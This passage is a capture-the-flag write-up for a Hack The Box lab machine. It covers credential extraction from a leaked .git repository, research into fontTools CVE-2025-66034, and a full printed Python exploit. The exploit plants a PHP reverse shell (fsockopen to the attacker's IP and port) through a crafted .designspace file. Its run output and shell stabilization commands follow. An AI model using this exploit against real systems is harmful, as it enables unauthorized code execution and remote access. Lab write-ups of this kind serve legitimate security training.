[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/production [404]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/stash [404]
[-] http://portal.variatype.htb/.git/logs/refs/stash responded with status code 404
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/packed-refs [404]
[-] http://portal.variatype.htb/.git/packed-refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/staging [404]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/heads/production responded with status code 404
[-] http://portal.variatype.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/main responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching http://portal.variatype.htb/.git/refs/stash [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/stash responded with status code 404
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main [404]
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://portal.variatype.htb/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d [200]
[-] Fetching http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/objects/50/30e791b764cb2a50fcb3e2279fea9737444870 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/6f/021da6be7086f2595befaa025a83d1de99478b [200]
[-] Fetching http://portal.variatype.htb/.git/objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf [200]
[-] Fetching http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 [200]
[-] Running git checkout .

┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
└─$ ls
dumped_repo
```
<div align="center">
<br>
<br>
</div>

##### Source Code & Version Control Analysis

```shell
┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
└─$ cd dumped_repo              

┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/dumped_repo]
└─$ ls
auth.php

┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/dumped_repo]
└─$ ls -a
.  ..  auth.php  .git

┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/dumped_repo]
└─$ cat auth.php       
<?php
session_start();
$USERS = [];

┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/dumped_repo]
└─$ git log                                                   
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation
```

The commit history shows:

| **Commit Hash** | **Message**                                                  | **Impact**                                                                                                                                                                           |
| --------------- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `5030e79...`    | `feat: initial portal implementation`                        | Likely contains the original logic for `auth.php`, including how the `$USERS` array was initially populated.                                                                         |
| `753b5f5...`    | `fix: add gitbot user for automated validation pipeline<br>` | **High Priority.** This commit explicitly mentions adding a `gitbot` user. In CTF environments, "automated pipeline" users often have hardcoded credentials or predictable patterns. |
<div align="center">
<br>
<br>
</div>

##### `git diff`

Compare the initial commit to the latest one.

**Command:** `git diff 5030e79 753b5f5`

**Breakdown:**

- `diff --git a/auth.php b/auth.php`
    - **Description:** Source File Comparison.
    - **Purpose:** Identifies that the changes occurred specifically within the authentication logic file.

**Output:**

```shell
┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/dumped_repo]
└─$ git diff 5030e79 753b5f5
diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

**Analysis:**

- `-$USERS = [];`
    - Removed Line (Red).
    - Shows the previous state where the user array was empty, likely a placeholder or a temporary "secure" state.
- `+$USERS = [` ... `+];`
    - Added Lines (Green).
    - Reveals the new hardcoded associative array containing the username and password pair.

**Extracted Credentials:**

- **Username:** `gitbot`
- **Password:** `G1tB0t_Acc3ss_2025!`
<div align="center">
<br>
<br>
</div>

#### 2.2.8 Authentication Bypass

With these credentials, the next step is to test them and try to gain access to the restricted area of the application.

1. **Navigate to Portal:** Open `http://portal.variatype.htb` in your browser.
2. **Input Credentials:** 
	* **Username:** `gitbot` 
    - **Password:** `G1tB0t_Acc3ss_2025!`
3. Click **Authenticate**.

![[Pasted image 20260322183239.png]]

Upon successfully authenticating to `portal.variatype.htb`, the landing page revealed a direct relationship with a generator tool.
- **Source Reference:** The dashboard explicitly states, "Recent font builds from the variable font generator".
- **Infrastructure Lead:** A footer note confirms that "Files are auto-archived from the main generator pipeline," suggesting a shared backend or file-syncing mechanism between the portal and the main site.

Based on the dashboard's lead navigate to the tools section. The **URL:** `http://variatype.htb/tools/variable-font-generator` is revealed. The page presents a file upload interface titled "Upload Files," designed to accept `.designspace` and master font files (`.ttf` or `.otf`).
<div align="center">
<br>
<br>
</div>

#### 2.2.9 Strategic Pivot

Initial enumeration of the `portal.variatype.htb` subdomain and the subsequent `.git` repository leak provided internal developer credentials. However, upon manual inspection of the portal dashboard, I determined that the interface was a dead lead or maybe not. 

I didn't see how to move forward so my focus returned to the primary application's core functionality. A detailed review of the `variatype.htb` homepage revealed a significant lead: the service explicitly markets its reliance on the **fonttools** engine—an industry-standard Python suite used for generating variable fonts.

Browse to the homepage: `http://variatype.htb`.

![[Pasted image 20260323072630.png]]
<div align="center">
<br>
<br>
</div>

#### 2.2.10 fonttools Research

FontTools is ==a powerful, open-source Python library and command-line toolset used to manipulate font files, including TTF, OTF, and WOFF formats==. It allows developers to subset, merge, inspect, and convert fonts (e.g., to XML using TTX). It is widely used in the font industry for automated font production pipelines.[^1]
<div align="center">
<br>
</div>

##### Vulnerability Identification 

Search online for `fonttools vulnerability`.[^2]

fontTools, a widely used Python library for manipulating fonts, has had two major vulnerabilities reported recently, including a critical Remote Code Execution (RCE) vulnerability in 2025 and an XML External Entity (XXE) vulnerability in 2023. 

1. Critical RCE in `varLib` (CVE-2025-66034)
	Discovered in late 2025, this is the most severe vulnerability affecting the `fontTools.varLib` module, which is used for generating variable fonts. [^3]
	- **Vulnerability Type:** Arbitrary File Write / Remote Code Execution (RCE).
	- **Affected Versions:** 4.33.0 to before 4.60.2.
	- **Description:** The vulnerability stems from insufficient input validation when processing `.designspace` files. An attacker can craft a malicious designspace file containing path traversal sequences (`../`) in the filename attributes. When processed by `fontTools.varLib.main()`, it can overwrite arbitrary files on the system.
	- **Impact:** By overwriting critical system files or injecting malicious code into Python modules, an attacker can achieve remote code execution (RCE) without elevated privileges.
	- **Mitigation:** Upgrade to **fonttools version 4.60.2 or later**.
	- **Workaround:** Avoid processing untrusted `.designspace` files and run font processing in sandboxed environments. [^4]

2. XXE Vulnerability in Subsetting Module (CVE-2023-45139) This vulnerability affects the subsetting module, which reduces the size of font files. [^5]
	- **Vulnerability Type:** XML External Entity Injection (XXE).
	- **Affected Versions:** 4.28.2 to before 4.43.0.
	- **Description:** The library failed to properly disable external entity expansion when parsing SVG tables in OpenType fonts (OT-SVG fonts).
	- **Impact:** Attackers can read arbitrary files from the host filesystem or make web requests from the host system.
	- **Mitigation:** Upgrade to **fonttools version 4.43.0 or later**. [^6]
<div align="center">
<br>
<br>
</div>

##### CVE-2025-66034 (varLib Insecure Deserialization)

The vulnerability, designated as **CVE-2025-66034**, resides within the `varLib` module of `fonttools`. This component is responsible for building variable fonts by interpolating master files based on rules defined in a `.designspace` file.

**Vulnerability Mechanism:** The `.designspace` format is essentially an XML file. The vulnerability exists because the `varLib` parser fails to securely handle specific attributes during the axis-mapping process. By crafting a malicious `.designspace` file, an attacker can trigger **Insecure Deserialization** or **Arbitrary Code Execution**. When the web application calls the vulnerable library to "Generate" the font, the embedded Python code is executed in the context of the server's service account.

![[Pasted image 20260323080214.png]] [^7]
<div align="center">
<br>
<br>
</div>

#### 2.2.11 PoC

The next step is to find or develop a **Proof of Concept** to verify if `http://variatype.htb/` is susceptible.

**Repository found:** [varlib-cve-2025-66034](https://github.com/symphony2colour/varlib-cve-2025-66034)

![[Pasted image 20260323081024.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1. Exploit Acquisition and Preparation

Clone the repository from GitHub to your local attack machine.

**Command:** `git clone https://github.com/symphony2colour/varlib-cve-2025-66034.git`

**Poc Audit:**

```shell
┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
└─$ ls
README.md  varlib_cve_2025_66034.py

┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
└─$ cat varlib_cve_2025_66034.py
```

```python
import argparse
import logging
import requests
import secrets
import string
import subprocess
import threading
import time

from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

TARGET_URL = "http://mysite.com/tools/variable-font-generator/process" #change if necessary
DEFAULT_PATH = "/var/www/mysite.com/public" #change if neccessary
TRIGGER_URL = "http://mysite.com" #change if necessary

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

def parse_args():
    parser = argparse.ArgumentParser(description="Varlib fontTools exploit")
    parser.add_argument("--ip", required=True, help="Listener IP")
    parser.add_argument("--port", required=True, type=int, help="Listener port")
    parser.add_argument("--path", default=DEFAULT_PATH, help="Filesystem path to write a shell")
    parser.add_argument("--url", default=TARGET_URL, help="Upload's Form URL")
    parser.add_argument("--trigger", default=TRIGGER_URL, help="URL to trigger the shell")
    parser.add_argument("--no-listen", action="store_true", help="Skip auto listener")
    
    return parser.parse_args()

#create fonts
def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)

    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})

    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()

    glyph = pen.glyph()

    fb.setupGlyf({".notdef": glyph})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "ExploitFont", "styleName": f"Weight{weight}"})

    fb.save(filename)



# Build reverse shell PHP
def build_php(ip, port):
     
    php_code = (
        f'<?php '
        f'$ip="{ip}";'
        f'$port={port};'
        f'$sock=fsockopen($ip,$port);'
        f'$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);'
        f'$proc=proc_open("/bin/bash -i",$descriptorspec,$pipes);'
        f'?>'
    )      
     
    return php_code


# Generate shell name
def gen_shell_name(prefix="shell_", length=8):
    """
    Generate something like shell_ab12cd34.php
    Only [a-z0-9] so it’s safe to drop into single quotes.
    """
    alphabet = string.ascii_lowercase + string.digits
    rand = ''.join(secrets.choice(alphabet) for _ in range(length))
    return f"{prefix}{rand}.php"



# Generate malicious designspace
def generate_designspace(ip, port, target_path, shellname):

    php_payload = build_php(ip, port)

    xml = f"""<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[{php_payload}]]]]><![CDATA[>]]></labelname>
            <labelname xml:lang="fr">PENTEST</labelname>
        </axis>
    </axes>

    <sources>
        <source filename="source-light.ttf" name="Light">
            <location>
                <dimension name="Weight" xvalue="100"/>
            </location>
        </source>
        <source filename="source-regular.ttf" name="Regular">
            <location>
                <dimension name="Weight" xvalue="400"/>
            </location>
        </source>
    </sources>

    <variable-fonts>
        <variable-font name="MaliciousFont" filename="{target_path}/{shellname}">
            <axis-subsets>
                <axis-subset name="Weight"/>
            </axis-subsets>
        </variable-font>
    </variable-fonts>
</designspace>
"""

    return xml


# Upload the payload
def upload_exploit(xml_payload, url):

    files = [
        ("designspace", ("malicious.designspace", xml_payload, "application/octet-stream")), #change if your upload form is different
        ("masters", ("source-light.ttf", open("source-light.ttf", "rb"), "font/ttf")),
        ("masters", ("source-regular.ttf", open("source-regular.ttf", "rb"), "font/ttf")),
    ]

    headers = {                         #add extra headers if necessary
        "User-Agent": "Mozilla/5.0",
    }

    r = requests.post(url, files=files, headers=headers)

    logging.info(f"[+] Server status: {r.status_code}")
    

def start_listener(port):
    logging.info(f"[+] Starting listener on port {port}...")

    return subprocess.Popen(
        ["nc", "-lvnp", str(port)],
        stdin=None,
        stdout=None,
        stderr=subprocess.DEVNULL
    )


def trigger_shell(shell_name, url):
    """
    Simple HTTP GET to execute the reverse shell payload.
    """
    url = f"{url}/{shell_name}"
    logging.info(f"[+] Triggering shell via {url}")
    try:
        r = requests.get(url, timeout=5)
        logging.info(f"[+] Trigger request status: {r.status_code}")
    except requests.RequestException as e:
        logging.warning(f"[!] Error while triggering shell.. try to trigger manually: {e}")


def main():
     
    args = parse_args()
     
    ip = args.ip
    port = args.port
    path = args.path
    url = args.url
    trigger_url = args.trigger
    
    if not (1 <= port <= 65535):
        sys.exit("[-] Invalid port number")
    
    if port > 10000:
        logging.warning("[!] Ports above 10000 may be blocked by your local firewall. Use ports like 4444, 9001, or 5050.")
    elif port < 1024:
        logging.warning("[!] Ports below 1024 require admin privileges to work as intended")
     
     
    logging.info(f"[+] Generating compatible master fonts...")
    create_source_font("source-light.ttf", weight=100)
    create_source_font("source-regular.ttf", weight=400)
    
    logging.info(f"[+] Generating shell name...")
    shell_name = gen_shell_name()     
      
    logging.info(f"[+] Using IP address: {ip} and Port Number: {port}")   
    logging.info(f"[+] Using shell name {shell_name}")
    
    logging.info(f"[+] Creating malicious designspace...")
    xml_payload = generate_designspace(ip, port, path, shell_name)

    logging.info(f"[+] Uploading payload...")
    upload_exploit(xml_payload, url)
    
    if not args.no_listen:
        
        try:
            listener_proc = start_listener(port)
            time.sleep(2)  # Give listener time to spin up
            
            trigger_shell(shell_name, trigger_url)
            listener_proc.wait()
            
        except KeyboardInterrupt:
            logging.info(f"[!] Interrupted...")
    else:
        trigger_shell(shell_name, trigger_url)

if __name__ == "__main__":
    main()
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Executing `varlib_cve_2025_66034.py`

**Validation Dashboard before running `varlib_cve_2025_66034.py`:**

![[Pasted image 20260322183239.png]]

**Command:** `python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path /var/www/portal.variatype.htb/public/files --trigger http://portal.variatype.htb/files --url http://variatype.htb/tools/variable-font-generator/process`

**Breakdown:**

- **`--ip / --port`**: Specifies the attacker’s machine where the shell will connect.
- **`--path`**: Defines the destination on the server's filesystem for the PHP shell.
- **`--trigger`**: The URL the script will request to execute the newly written file.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
└─$ python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path /var/www/portal.variatype.htb/public/files --trigger http://portal.variatype.htb/files --url http://variatype.htb/tools/variable-font-generator/process
[INFO] [+] Generating compatible master fonts...
[INFO] [+] Generating shell name...
[INFO] [+] Using IP address: 10.10.14.71 and Port Number: 4444
[INFO] [+] Using shell name shell_k228w7aw.php
[INFO] [+] Creating malicious designspace...
[INFO] [+] Uploading payload...
[INFO] [+] Server status: 200
[INFO] [+] Starting listener on port 4444...
[INFO] [+] Triggering shell via http://portal.variatype.htb/files/shell_k228w7aw.php
[INFO] [+] Trigger request status: 200
bash: cannot set terminal process group (3343): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public/files$ 
```

The automated exploit successfully executed, providing a shell as the **www-data** user. This confirms the critical vulnerability in the `fontTools` library.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation

### 4.1 Shell Stabilization

The current shell is a "dumb" shell, meaning it lacks tab completion, job control, and the ability to use interactive commands. Stabilizing this shell is the first priority to prevent accidental disconnection.

**Command:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`

**Breakdown:**

- `import pty`
	- Description: Pseudo-Terminal Module
	- Purpose: Accesses Python's internal library for terminal control.
- `pty.spawn("/bin/bash")`
	- Description: Terminal Spawning
	- Purpose: Upgrades the current raw `/bin/sh` to a more feature-rich `/bin/bash` instance.

**Result:**

```shell
www-data@variatype:~/portal.variatype.htb/public/files$ python3 -c 'import pty; pty.spawn("/bin/bash")' 
<es$ python3 -c 'import pty; pty.spawn("/bin/bash")'    
www-data@variatype:~/portal.variatype.htb/public/files$
```

While `pty.spawn` gives you a functional terminal, it doesn't handle window resizing, special characters (like `Ctrl+C`), or tab completion until you background the process and fix the terminal settings on your **local** (Kali) machine.

To achieve a "Gold Standard" interactive shell, follow these steps:
<div align="center">
<br>
<br>
</div>

#### Step 1: Background the Shell

In your current terminal, press **Ctrl+Z**. This suspends the reverse shell and returns you to your Kali prompt.

**Result:**

```shell
www-data@variatype:~/portal.variatype.htb/public/files$ ^Z
zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url

┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
└─$ 
```
<div align="center">
<br>
<br>
</div>

#### Step 2: Set Local Terminal to Raw Mode

**Command:** `stty raw -echo; fg`

**Breakdown:**

- **`stty raw`**: Tells your local terminal to pass all keyboard input (including `Ctrl+C` and `Tab`) directly to the remote shell without processing it locally.
- **`-echo`**: Disables local echoing so you don't see double characters.
- **`fg`**: Brings the backgrounded reverse shell back to the foreground.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
└─$ stty raw -echo; fg
[1]  + continued  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
```
<div align="center">
<br>
<br>
</div>

#### Step 3: Reset Remote Environment

Once the shell is back, type `reset` and hit enter. If it asks for a terminal type, type `xterm-256color`.

```shell
┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
└─$ stty raw -echo; fg
[1]  + continued  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
                                                                                               reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

















www-data@variatype:~/portal.variatype.htb/public/files$
```
<div align="center">
<br>
<br>
</div>

#### Step 4: Set Environment Variables

**Command:** `export TERM=xterm-256color; export SHELL=bash`

**Breakdown:**

- **`export TERM=xterm-256color`**: Enables terminal colors and support for text editors like `vim` or `nano`.
- **`export SHELL=bash`**: Defines the default shell environment for the current session.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Initial Survey & Enumeration

With the shell now stabilized, you can survey the local environment to map the filesystem and identify potential vectors for lateral movement or privilege escalation.

**Command:** `id; ls -la /home; sudo -l`

**Breakdown:**

- `id`
    - **Description:** User Identity Discovery.
    - **Purpose:** Displays the current user's UID (User ID), GID (Group ID), and group memberships to confirm the execution context of the shell.
- `ls -la /home`
    - **Description:** Home Directory Enumeration.
    - **Purpose:** Lists all user directories on the system to identify legitimate human users or service accounts that may serve as targets for lateral movement.
- `sudo -l`
    - **Description:** List Sudo Permissions.
    - **Purpose:** Checks the `/etc/sudoers` configuration to see if the `www-data` account has been granted any specific administrative privileges or passwordless command execution.

**Output:**

```shell
lww-data@variatype:~/portal.variatype.htb/public/files$ id; ls -la /home; sudo - 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
total 12
drwxr-xr-x  3 root  root  4096 Dec  5 13:59 .
drwxr-xr-x 18 root  root  4096 Mar  9 08:29 ..
drwx------  8 steve steve 4096 Feb 27 06:16 steve
[sudo] password for www-data: 
sudo: a password is required
www-data@variatype:~/portal.variatype.htb/public/files$ 
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. Conclusion & Remediation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

[^1]: [what is fonttools](https://www.google.com/search?q=what+is+fonttools&sca_esv=1523a71ad38dbb4c&sxsrf=ANbL-n6YQh4v65dns8qxdQChLxL77Jz6yg%3A1774240335377&ei=T8LAaczeFvjEkPIPwuXPsQ4&biw=2124&bih=1062&ved=0ahUKEwiMwr6nmLWTAxV4IkQIHcLyM-YQ4dUDCBE&uact=5&oq=what+is+fonttools&gs_lp=Egxnd3Mtd2l6LXNlcnAiEXdoYXQgaXMgZm9udHRvb2xzMggQABiABBiiBDIIEAAYgAQYogQyCBAAGKIEGIkFMggQABiABBiiBDIIEAAYgAQYogRImDdQ8xVY-jJwAXgBkAEAmAHtAqABpRWqAQMzLTi4AQPIAQD4AQGYAgegArMQwgIHECMYsAMYJ8ICChAAGLADGNYEGEfCAg0QABiABBiwAxhDGIoFwgIHECMYsAIYJ8ICBxAAGIAEGA3CAgYQABgHGB7CAggQABgHGAgYHsICCxAAGIAEGIYDGIoFwgIFEAAY7wXCAgYQABgNGB6YAwCIBgGQBgqSBwUxLjMtNqAH6yCyBwMzLTa4B6gQwgcHMC4xLjIuNMgHMIAIAA&sclient=gws-wiz-serp)

[^2]: [fonttools vulnerability](https://www.google.com/search?q=fonttools+vulnerability&sca_esv=1523a71ad38dbb4c&biw=2124&bih=1062&sxsrf=ANbL-n64_VrM1O32sHB2n0qn3v1APPzWWQ%3A1774240346706&ei=WsLAaZ3mKszCkPIPhKPwyA0&oq=fonttools&gs_lp=Egxnd3Mtd2l6LXNlcnAiCWZvbnR0b29scyoCCAEyChAjGIAEGCcYigUyBBAjGCcyBhAAGAcYHjIGEAAYBxgeMgYQABgHGB4yBhAAGAcYHjIGEAAYBxgeMgYQABgHGB4yBhAAGAcYHjIGEAAYBxgeSIuGB1D28gZY9vIGcAR4AZABAJgB1QKgAdUCqgEDMy0xuAEByAEA-AEBmAIFoAL_AsICChAAGLADGNYEGEeYAwCIBgGQBgiSBwU0LjMtMaAHkweyBwMzLTG4B-ICwgcFMi00LjHIByCACAA&sclient=gws-wiz-serp)

[^3]: [fonttools - CVE-2025-66034 · GitHub Advisory Database](https://github.com/advisories/GHSA-768j-98cg-p3fv#:~:text=Summary,overwriting%20/etc/passwd%20)
	[CVE-2025-66034 - Red Hat Customer Portal](https://access.redhat.com/security/cve/cve-2025-66034)
	[CVE-2025-66034 - OSV.dev](https://osv.dev/vulnerability/CVE-2025-66034)
	[CVE-2025-66034: Fonttools Fonttools RCE Vulnerability](https://www.sentinelone.com/vulnerability-database/cve-2025-66034/)

[^4]: [CVE-2025-66034: Fonttools Fonttools RCE Vulnerability](https://www.sentinelone.com/vulnerability-database/cve-2025-66034/)
	[Arbitrary File Write and XML injection in fontTools.varLib - GitHub](https://github.com/fonttools/fonttools/security/advisories/GHSA-768j-98cg-p3fv)
	[fontTools is Vulnerable to Arbitrary File Write and XML injection in ...](https://advisories.gitlab.com/pkg/pypi/fonttools/CVE-2025-66034/)
	[fonttools - CVE-2025-66034 · GitHub Advisory Database](https://github.com/advisories/GHSA-768j-98cg-p3fv)
	[CVE-2025-66034 - Red Hat Customer Portal](https://access.redhat.com/security/cve/cve-2025-66034)

[^5]: [CVE-2023-45139 Impact, Exploitability, and Mitigation Steps -](https://www.wiz.io/vulnerability-database/cve/cve-2023-45139)

[^6]: [CVE-2023-45139 Detail - NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-45139)
	[CVE-2023-45139 Impact, Exploitability, and Mitigation Steps - Wiz](https://www.wiz.io/vulnerability-database/cve/cve-2023-45139)[](https://www.wiz.io/vulnerability-database/cve/cve-2023-45139)

[^7]: [CVE-2025-66034 Detail](https://nvd.nist.gov/vuln/detail/CVE-2025-66034)
